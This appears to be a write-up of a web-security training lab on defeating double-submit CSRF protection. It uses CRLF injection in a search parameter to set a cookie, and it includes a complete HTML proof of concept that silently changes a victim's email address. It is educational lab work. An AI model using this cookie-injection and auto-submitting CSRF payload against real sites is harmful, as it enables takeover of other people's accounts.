# CSRF where token is duplicated in cookie

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Credentials - wiener:peter, carlos:montoya

### Analysis/Exploitation -

**Find weak CSRF protection**

Login as user `wiener`:

It is immediately obvious that the csrf token appears twice: in the request body as well as in a cookie. This could mean two things:

1. The backend does not do any csrf tracking and just verifies that the body token equals the cookie token which was set at some time earlier
(in this case, during the initial visit of the `/login` page)
1. The backend tracks the csrf tokens as usual, just uses the cookie value as additional line of defense.This is so call the “double submit” defense against CSRF.
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/55396d3f-1cc6-43e1-ba2a-ab28a3cc836f/2024-02-20_19-40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TUCQROTK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204628Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCX7D6qmOxf%2Bs%2FevhNN81X%2FUy4dNS2HFEdk1W1mMX34QQIhAJgyKWr8Eu22sw9Yk6f2iafpQHOwafb1j3ZKCbutTQ%2FxKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgweANJz6asWHHckrCAq3APqIYTIUYZ0Nx0E%2FGs4k%2BYNfrM7tT6YsxQXNTD7dwwhOUCTvaT32YBkpBi3K1eYxPOm23zSM7l7qXuJOtkeDjY4h5vjagzKNXS4HFvvzJJy2uvg8uOVl0sieJKqpvrz23VvJT12mZ6BcZQrUVoSLwRi2%2BW0zEWrbrL5NseOFhJz2RtrEjExF1vXOEZGTKK5YkcqLWp7XGxzMipjRsXvsuOPvj1OGP7%2Fj%2FJjkePyne%2B5jiYcp0WG1as858HC2IHqUsLrUatPY3A9Hi%2FJTocvthZY0qXl98PfPFjFCU0xcBZD1kPSKN8lyxkrYXNL9lSKnDEqwPCyMlgijsD%2Fgueru29Ut%2BIkbc1%2BifXhYIweKVsyhFFBTazqHU3rh6ziCj4voWIDASUSgqtdBZDaRbOx%2BoebjpPWIFCbd8ze1bwJiL6K%2FVr1MdUx9sUQoETqj7vN4J2lCBiYFO%2Fk%2FXLjVAbySJGd7NKTAP7R7vNk5ktyerJQL%2FmPIsmQIqK2APn1mo5VPvk%2FDkI9U4Rs9rGonIDML19DOrsvhqXD8Q2nZIsFxB3WKevQgqpDWefXB%2BjQAfkFKyqWMCClcMmMnXsg1BfNtbMt3UZixvUl3uYowkQxeuAUIrkFt4W4vgrC64xozzD%2FxaLUBjqkAcqCh4GqDieO4krRpJuajPWKUf2Ax0FCbNGL6yDch5VMIxzh5ZQvGuFdBXe8VkKKmF0V4uvg%2FMuVdFetdcQYuf9bHoT05aRJWjkI5wUNrj7v6N6k11zHnn4s5oUr5f4%2FnyCir%2FzTNhoZkxpjezCsrS8wP%2Bw1IsGNYZhBDL%2BHn%2BUe0%2BBxEd43Gbbqhllts5mYN5l9ab7DgOcaWm5TEW7F8jpY6Nnr&X-Amz-Signature=aa13724702c0bb006fd2e19aa2c608aca7b42014685e2fc63b1125bc2497afe7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

the request goes through and the email get updated.

If this don’t work we could try valid CSRF token and cookie from another user since backend tracks the csrf tokens and it could be find out  whether csrf token are tied to session cookie.


**Find ways to set the csrf token**

the blog suffers the same vulnerability in the search feature

**When we click the **`Search`** button, it’ll send a GET request to **`/`** with the parameter **`search`**.**

**Also, when we sent the request, it’ll set a new cookie value: **`LastSearchTerm=<seach_parameter_value>`**!**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/8533d25a-7752-4f8b-87bd-a0854ec3b792/2024-02-20_20-30.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TUCQROTK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204628Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCX7D6qmOxf%2Bs%2FevhNN81X%2FUy4dNS2HFEdk1W1mMX34QQIhAJgyKWr8Eu22sw9Yk6f2iafpQHOwafb1j3ZKCbutTQ%2FxKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgweANJz6asWHHckrCAq3APqIYTIUYZ0Nx0E%2FGs4k%2BYNfrM7tT6YsxQXNTD7dwwhOUCTvaT32YBkpBi3K1eYxPOm23zSM7l7qXuJOtkeDjY4h5vjagzKNXS4HFvvzJJy2uvg8uOVl0sieJKqpvrz23VvJT12mZ6BcZQrUVoSLwRi2%2BW0zEWrbrL5NseOFhJz2RtrEjExF1vXOEZGTKK5YkcqLWp7XGxzMipjRsXvsuOPvj1OGP7%2Fj%2FJjkePyne%2B5jiYcp0WG1as858HC2IHqUsLrUatPY3A9Hi%2FJTocvthZY0qXl98PfPFjFCU0xcBZD1kPSKN8lyxkrYXNL9lSKnDEqwPCyMlgijsD%2Fgueru29Ut%2BIkbc1%2BifXhYIweKVsyhFFBTazqHU3rh6ziCj4voWIDASUSgqtdBZDaRbOx%2BoebjpPWIFCbd8ze1bwJiL6K%2FVr1MdUx9sUQoETqj7vN4J2lCBiYFO%2Fk%2FXLjVAbySJGd7NKTAP7R7vNk5ktyerJQL%2FmPIsmQIqK2APn1mo5VPvk%2FDkI9U4Rs9rGonIDML19DOrsvhqXD8Q2nZIsFxB3WKevQgqpDWefXB%2BjQAfkFKyqWMCClcMmMnXsg1BfNtbMt3UZixvUl3uYowkQxeuAUIrkFt4W4vgrC64xozzD%2FxaLUBjqkAcqCh4GqDieO4krRpJuajPWKUf2Ax0FCbNGL6yDch5VMIxzh5ZQvGuFdBXe8VkKKmF0V4uvg%2FMuVdFetdcQYuf9bHoT05aRJWjkI5wUNrj7v6N6k11zHnn4s5oUr5f4%2FnyCir%2FzTNhoZkxpjezCsrS8wP%2Bw1IsGNYZhBDL%2BHn%2BUe0%2BBxEd43Gbbqhllts5mYN5l9ab7DgOcaWm5TEW7F8jpY6Nnr&X-Amz-Signature=380eb5e1e0d6e030987fd6d825e3f4fc834301eb4ba69b65eaa86eaa998734cb&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**we have found that it’s vulnerable to CRLF injection, which enables attacker to add a new cookie!**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cfa8c277-988d-49b1-9a5b-6c2c64a2f4f5/2024-02-20_20-38.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TUCQROTK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204628Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCX7D6qmOxf%2Bs%2FevhNN81X%2FUy4dNS2HFEdk1W1mMX34QQIhAJgyKWr8Eu22sw9Yk6f2iafpQHOwafb1j3ZKCbutTQ%2FxKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgweANJz6asWHHckrCAq3APqIYTIUYZ0Nx0E%2FGs4k%2BYNfrM7tT6YsxQXNTD7dwwhOUCTvaT32YBkpBi3K1eYxPOm23zSM7l7qXuJOtkeDjY4h5vjagzKNXS4HFvvzJJy2uvg8uOVl0sieJKqpvrz23VvJT12mZ6BcZQrUVoSLwRi2%2BW0zEWrbrL5NseOFhJz2RtrEjExF1vXOEZGTKK5YkcqLWp7XGxzMipjRsXvsuOPvj1OGP7%2Fj%2FJjkePyne%2B5jiYcp0WG1as858HC2IHqUsLrUatPY3A9Hi%2FJTocvthZY0qXl98PfPFjFCU0xcBZD1kPSKN8lyxkrYXNL9lSKnDEqwPCyMlgijsD%2Fgueru29Ut%2BIkbc1%2BifXhYIweKVsyhFFBTazqHU3rh6ziCj4voWIDASUSgqtdBZDaRbOx%2BoebjpPWIFCbd8ze1bwJiL6K%2FVr1MdUx9sUQoETqj7vN4J2lCBiYFO%2Fk%2FXLjVAbySJGd7NKTAP7R7vNk5ktyerJQL%2FmPIsmQIqK2APn1mo5VPvk%2FDkI9U4Rs9rGonIDML19DOrsvhqXD8Q2nZIsFxB3WKevQgqpDWefXB%2BjQAfkFKyqWMCClcMmMnXsg1BfNtbMt3UZixvUl3uYowkQxeuAUIrkFt4W4vgrC64xozzD%2FxaLUBjqkAcqCh4GqDieO4krRpJuajPWKUf2Ax0FCbNGL6yDch5VMIxzh5ZQvGuFdBXe8VkKKmF0V4uvg%2FMuVdFetdcQYuf9bHoT05aRJWjkI5wUNrj7v6N6k11zHnn4s5oUr5f4%2FnyCir%2FzTNhoZkxpjezCsrS8wP%2Bw1IsGNYZhBDL%2BHn%2BUe0%2BBxEd43Gbbqhllts5mYN5l9ab7DgOcaWm5TEW7F8jpY6Nnr&X-Amz-Signature=8ad99d263a24f9518b4fec666b4313657074dcdc0d8b4c36234d574d36d38d2d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

generate csrf poc

Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:

```text
<img src="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/8ad58dd2-a838-4736-93a1-2d575b15da75/2024-02-20_22-00.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TUCQROTK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204628Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCX7D6qmOxf%2Bs%2FevhNN81X%2FUy4dNS2HFEdk1W1mMX34QQIhAJgyKWr8Eu22sw9Yk6f2iafpQHOwafb1j3ZKCbutTQ%2FxKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgweANJz6asWHHckrCAq3APqIYTIUYZ0Nx0E%2FGs4k%2BYNfrM7tT6YsxQXNTD7dwwhOUCTvaT32YBkpBi3K1eYxPOm23zSM7l7qXuJOtkeDjY4h5vjagzKNXS4HFvvzJJy2uvg8uOVl0sieJKqpvrz23VvJT12mZ6BcZQrUVoSLwRi2%2BW0zEWrbrL5NseOFhJz2RtrEjExF1vXOEZGTKK5YkcqLWp7XGxzMipjRsXvsuOPvj1OGP7%2Fj%2FJjkePyne%2B5jiYcp0WG1as858HC2IHqUsLrUatPY3A9Hi%2FJTocvthZY0qXl98PfPFjFCU0xcBZD1kPSKN8lyxkrYXNL9lSKnDEqwPCyMlgijsD%2Fgueru29Ut%2BIkbc1%2BifXhYIweKVsyhFFBTazqHU3rh6ziCj4voWIDASUSgqtdBZDaRbOx%2BoebjpPWIFCbd8ze1bwJiL6K%2FVr1MdUx9sUQoETqj7vN4J2lCBiYFO%2Fk%2FXLjVAbySJGd7NKTAP7R7vNk5ktyerJQL%2FmPIsmQIqK2APn1mo5VPvk%2FDkI9U4Rs9rGonIDML19DOrsvhqXD8Q2nZIsFxB3WKevQgqpDWefXB%2BjQAfkFKyqWMCClcMmMnXsg1BfNtbMt3UZixvUl3uYowkQxeuAUIrkFt4W4vgrC64xozzD%2FxaLUBjqkAcqCh4GqDieO4krRpJuajPWKUf2Ax0FCbNGL6yDch5VMIxzh5ZQvGuFdBXe8VkKKmF0V4uvg%2FMuVdFetdcQYuf9bHoT05aRJWjkI5wUNrj7v6N6k11zHnn4s5oUr5f4%2FnyCir%2FzTNhoZkxpjezCsrS8wP%2Bw1IsGNYZhBDL%2BHn%2BUe0%2BBxEd43Gbbqhllts5mYN5l9ab7DgOcaWm5TEW7F8jpY6Nnr&X-Amz-Signature=33c46c4d0b1654b6b01f8d900f4b73ae6eed01c6ad4ad9b931d71b9a6fc02f73&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="hidden" name="csrf" value="abcd" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
